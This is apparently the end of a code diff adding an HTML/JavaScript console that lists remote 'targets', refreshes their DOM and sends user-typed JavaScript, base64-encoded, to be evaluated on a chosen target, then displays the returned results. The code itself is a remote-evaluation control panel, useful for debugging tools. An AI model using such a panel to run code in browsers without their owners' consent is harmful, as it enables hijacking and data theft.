+            let targets = result;
+            // TODO validate targets before updating
+            targetslist = targets;
+            refreshTargets(targets);
+        }
+
+        function process_ExecEvaluate(result) {
+
+            result = atob(result);
+            try {
+                result = JSON.parse(result);
+            } catch (ex) {
+                
+            }
+
+            result = result || {};
+            
+            keys = [ 'builtincmd', 'cmdid', 'resultid', 'targetId' ];
+
+            keys.forEach( key => {
+                result[key] = message[key];
+            });
+            
+            addResult(result);
+        }
+
+    </script>
+
+    <!-- commands logic -->
+    <script>
+        function executeTargetCmd() {
+            console.log('executeTargetCmd');
+
+            let targetId = getTargetId();
+
+            let cmdname = document.getElementById('cmdname').value;
+
+            if ( cmdname == 'RefreshDOM' ) {
+                return refreshDOM();
+            }
+
+            let payload = createBuiltInCmd(cmdname);
+
+            payload['targetid'] = targetId;
+
+            let expression = document.getElementById('evaluateCmd').value;
+
+            if ( cmdname == 'ExecEvaluate' ) {
+                const bytes = new TextEncoder().encode(expression);
+                const binaryString = String.fromCodePoint(...bytes);
+                const base64String = btoa(binaryString);
+
+                payload['expression'] = base64String;
+            }
+
+            sendMessage(payload);
+        }
+
+        function refreshDOM() {
+            let targetId = getTargetId();
+
+            let payload = createBuiltInCmd('RefreshDOM');
+            payload['targetid'] = targetId;
+
+            sendMessage(payload);
+        }
+
+    </script>
+
+
+</body>
+
+</html>
